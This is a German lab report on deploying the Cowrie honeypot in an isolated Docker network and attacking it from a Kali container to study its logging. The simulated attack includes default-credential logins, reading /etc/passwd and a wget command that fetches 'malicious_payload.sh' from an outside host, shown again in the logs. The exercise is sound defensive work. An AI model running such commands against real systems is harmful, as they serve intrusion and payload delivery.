# Honeypot

Für diese Übung habe ich den Honeypot **Cowrie** eingerichtet und getestet. Cowrie ist ein Medium-Interaction Honeypot, der SSH und Telnet simuliert.

## 1. Auswahl & Funktionsweise
- **Typ:** Medium-Interaction Honeypot
- **Dienste:** SSH (Port 2222) und Telnet (Port 2223)
- **Funktionsweise:** Cowrie emuliert eine Linux-Umgebung (Debian). Wenn sich ein Angreifer verbindet, landet er in einer vorgetäuschten Shell. Er kann Standardbefehle ausführen (wie `ls`, `uname -a`, `cat /etc/passwd`, `wget`), das System ist aber eine simulierte Umgebung in Python. Sämtliche Tastatureingaben, Passwörter, Sitzungen und versuchte Datei-Downloads werden mitgeloggt.

## 2. Sicherheitsmassnahmen auf dem Host
Da der Honeypot auf dem eigenen Laptop läuft, darf er auf keinen Fall ein Einfallstor in das eigene Heimnetzwerk oder den Host darstellen.

| Risiko | Massnahme | Begründung / Wirkung |
| :--- | :--- | :--- |
| **Pivoting / Lateral Movement** | Docker-Netzwerk mit `--internal` | Verhindert, dass vom Honeypot aus Geräte im privaten WLAN/LAN gescannt oder angegriffen werden können. |
| **Angriffe von aussen auf den Host** | Kein Port-Forwarding auf den Laptop | Port 2222 wird nicht mit `-p` auf dem Laptop geöffnet. Der Honeypot ist nur innerhalb des internen Docker-Netzwerks erreichbar. |
| **Malware-Download / Botnet** | Egress komplett blockiert | Durch `--internal` hat der Container kein Standard-Gateway ins Internet. Download-Versuche (`wget`, `curl`) schlagen fehl. |
| **Host-Überlastung (DoS / Fork-Bombs)** | `--memory="512m"`, `--cpus="0.5"`, `--pids-limit 100` | Begrenzt Arbeitsspeicher, CPU-Kerne und die Anzahl paralleler Prozesse, damit der Host-Laptop nicht einfriert. |
| **Container-Escape** | `--security-opt=no-new-privileges:true` & User `cowrie` | Verhindert Rechteausweitung über SUID-Binaries und mountet weder Host-Verzeichnisse noch den Docker-Socket. |

### Netzwerkaufbau
```
Host-Laptop (Windows / WSL2)
  └── Docker-Netzwerk: "honeynet" (isoliert, kein Internetzugriff)
        ├── Cowrie Honeypot (172.18.0.2:2222)
        └── Kali Linux Container (172.18.0.3, Angreifer)
```

## 3. Installation & Start

Zuerst wird das isolierte Docker-Netzwerk ohne Internetverbindung erstellt:
```bash
docker network create --internal honeynet
```

Anschliessend wird der Container mit den Sicherheits- und Ressourcenbeschränkungen gestartet:
```bash
docker run -d \
  --name cowrie-honeypot \
  --network honeynet \
  --memory="512m" \
  --cpus="0.5" \
  --pids-limit 100 \
  --security-opt=no-new-privileges:true \
  cowrie/cowrie:latest
```

Status und Logs überprüfen:
```bash
docker ps --filter name=cowrie-honeypot
docker logs cowrie-honeypot
```

Ausgabe beim Start:
```text
[cowrie.plugin#info] Cowrie Version 3.1.0
[-] CowrieSSHFactory starting on 2222
[cowrie.ssh.factory.CowrieSSHFactory#info] Ready to accept SSH connections
```

## 4. Testen & Angriffssimulation
Für die Tests wurde ein Kali-Linux-Container (`m182kalilab-kali`) in dasselbe interne Docker-Netzwerk gehängt.

### Schritt 1: Banner Grab
Überprüfung des Dienstes auf Port 2222:
```text
Port 2222 Banner: SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3
```
Der Honeypot täuscht einen normalen OpenSSH-Dienst unter Debian 12 vor.

### Schritt 2: Login-Versuche
Es wurden simulierte Logins mit Standard-Credentials ausprobiert (`root:123456`, `admin:admin123`, `root:toor`). Cowrie lässt solche Kombinationen absichtlich durch, um den Angreifer tiefer ins System zu locken.

### Schritt 3: Ausführen von Befehlen
Nach erfolgreicher Anmeldung wurden typische Enumeration-Befehle und ein Download abgesetzt:
```bash
ssh -p 2222 root@cowrie-honeypot "uname -a; whoami; cat /etc/passwd | head -n 5; wget http://1.1.1.1/malicious_payload.sh"
```

Ausgabe im Terminal:
```text
Linux svr04 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux
root
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
--2026-10-02 11:52:15--  http://1.1.1.1/malicious_payload.sh
Connecting to 1.1.1.1:80... connected.
HTTP request sent, awaiting response...
```

## 5. Protokollierung & Analyse
In den Logfiles (`cowrie.json`) zeichnet der Honeypot alle Aktivitäten auf:

### Angreifer-Fingerprinting (HASSH)
```text
[ssh,020959cb52ba,172.18.0.3] New connection: 172.18.0.3:51868 (172.18.0.2:2222)
[ssh,020959cb52ba,172.18.0.3] Remote SSH version: SSH-2.0-OpenSSH_10.4p1 Debian-4
[ssh,020959cb52ba,172.18.0.3] SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356
```
Cowrie ermittelt anhand der SSH-Algorithmen einen HASSH-Fingerprint. Dadurch können Angriffstools wiedererkannt werden, selbst wenn der Banner geändert wird.

### Gespeicherte Anmeldedaten
Jeder Loginversuch wird strukturiert protokolliert:
```json
{
  "eventid": "cowrie.login.failed",
  "src_ip": "172.18.0.3",
  "src_port": 51868,
  "username": "root",
  "password": "123456",
  "timestamp": "2026-10-02T11:53:25.120613Z"
}
```

### Abgesetzte Befehle
```text
CMD: uname -a; whoami; cat /etc/passwd | head -n 5; wget http://1.1.1.1/malicious_payload.sh
Command found: uname -a
Command found: whoami
Command found: cat /etc/passwd
Command found: wget http://1.1.1.1/malicious_payload.sh
```

### Wirksamkeit der Netzwerk-Isolation
Beim Versuch, über `wget` eine Schadsoftware nachzuladen, greift die Docker-Isolation:
```text
twisted.internet.error.NoRouteError: No route to host: 101: Network is unreachable.
Attempt to download file(s) from URL (http://1.1.1.1/malicious_payload.sh) failed
```
Da das Netzwerk mit `--internal` erstellt wurde, gibt es keine Route nach draussen. Der Host und das Heimnetzwerk blieben komplett geschützt.

# Reflektion

- **Funktionsweise:**  
  Cowrie bietet einen guten Mittelweg. Im Gegensatz zu einem Low-Interaction Honeypot (der nur Ports offen hält) kann der Angreifer hier tatsächlich Befehle ausführen. Da es sich aber um ein emuliertes Dateisystem in Python handelt, besteht kein direkter Root-Zugriff auf das Host-System wie bei einem High-Interaction Honeypot.

- **Einsatz im Alltag:**  
  - **Frühwarnsystem (Canary):** Platziert man Cowrie im internen Firmennetzwerk (wo normalerweise kein SSH auf diesem Port laufen sollte), ist jeder Verbindungsversuch ein klares Zeichen, dass ein Angreifer bereits im Netz ist (Lateral Movement).
  - **Angriffsmuster erkennen:** In einer DMZ kann man analysieren, welche Benutzernamen, Passwörter und Skripte Angreifer aktuell verwenden.
  - **Zeitgewinn:** Angreifer halten sich mit dem Fake-System auf, was Zeit für Erkennung und Gegenmassnahmen verschafft.

- **Fazit zur Härtung:**  
  Einen Honeypot ungesichert auf dem eigenen Rechner laufen zu lassen (z. B. mit Port 2222 offen ins lokale Netz), wäre fahrlässig. Mit den richtigen Docker-Parametern (`--internal`, `--security-opt`, Speicher- und CPU-Limits) lässt sich das Ganze aber gefahrlos lokal testen und analysieren.
    